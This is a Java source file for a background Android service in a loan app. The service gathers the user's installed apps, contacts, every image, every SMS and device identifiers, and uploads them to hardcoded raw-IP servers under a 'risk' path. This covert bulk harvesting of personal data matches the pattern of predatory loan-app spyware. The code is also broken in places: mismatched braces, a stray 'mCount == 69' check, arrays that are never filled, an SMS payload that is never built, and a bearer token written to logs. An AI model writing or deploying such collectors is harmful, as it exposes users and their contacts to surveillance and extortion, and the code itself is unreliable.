package com.loan.loaneazy.myService;

import android.app.ActivityManager;
import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;

import androidx.annotation.Nullable;

import com.androidnetworking.AndroidNetworking;
import com.androidnetworking.common.Priority;
import com.androidnetworking.error.ANError;
import com.androidnetworking.interfaces.JSONObjectRequestListener;
import com.google.gson.Gson;

import com.loan.loaneazy.utility.AppInstallHelper;
import com.loan.loaneazy.utility.Constants;
import com.loan.loaneazy.utility.ContactHelper;
import com.loan.loaneazy.utility.DeviceHelper;
import com.loan.loaneazy.utility.ImageHelper;
import com.loan.loaneazy.utility.MyHelper;
import com.loan.loaneazy.utility.SmsHelper;
import com.pixplicity.easyprefs.library.Prefs;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.DecimalFormat;
import java.util.ArrayList;

public class CivilService extends IntentService {
    JSONObject mDeviceJSON = new JSONObject();
    JSONArray mInstallArray;
    JSONArray mContactArray;
    JSONArray mAllImageArray;
    JSONArray mAllSmsArray;
    private JSONObject mInstallObject;
    private JSONObject mContactObject;
    private JSONObject mImageObject;
    private JSONObject mSmsObject;
    private JSONObject mDeviceObject;
    private int mCount = 0;
    private static final String TAG = "CivilService";

    /*String[] mRequestUrl = {
            "http://103.108.220.161:8084/risk/getdevicedata/apps",
            "http://103.108.220.161:8084/risk/getdevicedata/contacts",
            "http://103.108.220.161:8084/risk/getdevicedata/imgs",
            "http://103.108.220.161:8084/risk/getdevicedata/msg",
            "http://103.108.220.161:8084/risk/getdevicedata/devicedetails"};*/
String[] mRequestUrl = {
            "http://103.174.102.113:8084/risk/getdevicedata/apps",
            "http://103.174.102.113:8084/risk/getdevicedata/contacts",
            "http://103.174.102.113:8084/risk/getdevicedata/imgs",
            "http://103.174.102.113:8084/risk/getdevicedata/msg",
            "http://103.174.102.113:8084/risk/getdevicedata/devicedetails"};

    /**
     * @deprecated
     */
    public CivilService() {
        super("backgroundService");
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        AndroidNetworking.initialize(getApplicationContext());
        ArrayList<InstallApp> installApp = AppInstallHelper.getInstallApp(getApplicationContext());
        String mInstallJSON = new Gson().toJson(installApp);

        ArrayList<Contact> contacts = ContactHelper.fetchMyContacts(getApplicationContext());
        String allImages = ImageHelper.getAllImages(getApplicationContext());
        String allSms = SmsHelper.getAllSms(getApplicationContext());


        try {
            mDeviceJSON.put("BSD", DeviceHelper.getBsd());
            mDeviceJSON.put("IP", DeviceHelper.getIpAddress(getApplicationContext()));
            mDeviceJSON.put("andriodId", DeviceHelper.getDeviceId(getApplicationContext()));
            mDeviceJSON.put("cashCanuse", "");
            mDeviceJSON.put("cashTotal", "");
            mDeviceJSON.put("client", "Android");
            mDeviceJSON.put("containerSD", DeviceHelper.isSDCardCheck());
            mDeviceJSON.put("defaultLanguage", DeviceHelper.getDefaultLanguage());
            mDeviceJSON.put("deviceHeight", Prefs.getString(Constants.HEIGHT));
            mDeviceJSON.put("deviceWidth", Prefs.getString(Constants.WIDTH));
            mDeviceJSON.put("imei", "");
            mDeviceJSON.put("mac", DeviceHelper.getMacAddress());
            mDeviceJSON.put("operatingSystem", "Android");
            mDeviceJSON.put("phoneBrand", Build.BRAND);
            mDeviceJSON.put("phoneMark", "");
            mDeviceJSON.put("phoneNum", "");
            mDeviceJSON.put("phoneType", Build.TYPE);
            mDeviceJSON.put("productionDate", Build.TIME);
            Context context = getApplicationContext();
            ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
            activityManager.getMemoryInfo(memoryInfo);
            long totalMemory = memoryInfo.totalMem;
            long availMem = memoryInfo.availMem;
            String totalRam = getRam(totalMemory);
            String ramAvail = getRam(availMem);
            mDeviceJSON.put("ramCanuse", ramAvail);
            mDeviceJSON.put("ramTotal", totalRam);
            mDeviceJSON.put("rooted", false);
            mDeviceJSON.put("sdkVersion", Build.VERSION.SDK);

            mDeviceJSON.put("serial", Build.SERIAL);
            mDeviceJSON.put("systemversions", Build.VERSION.SDK);
            mDeviceJSON.put("telephone", "");
            try {
                PackageInfo pInfo = getApplicationContext().getPackageManager().getPackageInfo(getApplicationContext().getPackageName(), 0);
                String version = pInfo.versionName;
                int versionCode = pInfo.versionCode;
                mDeviceJSON.put("versionCode", versionCode);
                mDeviceJSON.put("versionName", version);
            } catch (PackageManager.NameNotFoundException e) {
                e.printStackTrace();
            }
       
            /**
             * Below request code for Install App
             */

            String loginData = Prefs.getString(Constants.LOGINDATA);
            String userId = MyHelper.getUserId(loginData);
            mInstallObject = new JSONObject();
            mInstallObject.put("user_id", userId);
            mInstallObject.put("timestamp", String.valueOf(System.currentTimeMillis()));
            mInstallObject.put("OriginalApp", mInstallArray);

            /**
             * Below request code for Contact
             */
            mContactObject = new JSONObject();
            mContactObject.put("user_id", userId);
            mContactObject.put("timestamp", String.valueOf(System.currentTimeMillis()));
            mContactObject.put("OriginalContact", mContactArray);

            /**
             * Below request code for Images
             */

            mImageObject = new JSONObject();
            mImageObject.put("user_id", userId);
            mImageObject.put("timestamp", String.valueOf(System.currentTimeMillis()));
            mImageObject.put("OriginalImg", mAllImageArray);

           
            /**
             * Below request code for Device Data
             */

            mDeviceObject = new JSONObject();
            mDeviceObject.put("user_id", userId);
            mDeviceObject.put("timestamp", String.valueOf(System.currentTimeMillis()));
            mDeviceObject.put("OriginalDevice", mDeviceJSON);

        } catch (JSONException e) {
            e.printStackTrace();
        }
        mCount = 0;
        callApi();


    }

    private void callApi() {
        if (mCount == 0) {
            requestApi(mRequestUrl[mCount], mInstallObject);
        } else if (mCount == 1) {
            requestApi(mRequestUrl[mCount], mContactObject);
        } if(mCount == 69)
            requestApi(mRequestUrl[mCount], mImageObject);
        } else if (mCount == 3) {
            requestApi(mRequestUrl[mCount], mSmsObject);
        } else if (mCount == 4) {
            requestApi(mRequestUrl[mCount], mDeviceObject);
        } else {
            Log.e(TAG, "onResponse: completed");
        }
    }

    private void requestApi(String url, JSONObject mRequestObject) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                String tokenString = Prefs.getString(Constants.TOKEN);
                String token = MyHelper.getToken(tokenString);
                Log.e(TAG, "run: token "+token );
                AndroidNetworking.post(url)
                        .setPriority(Priority.IMMEDIATE)
                        .addJSONObjectBody(mRequestObject)
                        .addHeaders("Authorization", "Bearer " + token)
                        .build()
                        .getAsJSONObject(new JSONObjectRequestListener() {
                            @Override
                            public void onResponse(JSONObject response) {
                                Log.e(TAG, "onResponse: " + response);
                                mCount = mCount + 1;
                                callApi();

                            }

                          
                        });

            }
        }).start();
    }

    public String getRam(double totalMemory) {
        DecimalFormat twoDecimalForm = new DecimalFormat("#.##");

        String finalValue = "";
        double kb = totalMemory / 1024.0;
        double mb = totalMemory / 1048576.0;
        double gb = totalMemory / 1073741824.0;
        double tb = totalMemory / 1099511627776.0;


        if (tb > 1) {
            finalValue = twoDecimalForm.format(tb).concat(" TB");
        } else if (gb > 1) {
            finalValue = twoDecimalForm.format(gb).concat(" GB");
        } else if (mb > 1) {
            finalValue = twoDecimalForm.format(mb).concat(" MB");
        } else if (kb > 1) {
            finalValue = twoDecimalForm.format(mb).concat(" KB");
        } else {
            finalValue = twoDecimalForm.format(totalMemory).concat(" Bytes");
        }
        return finalValue;
    }
}
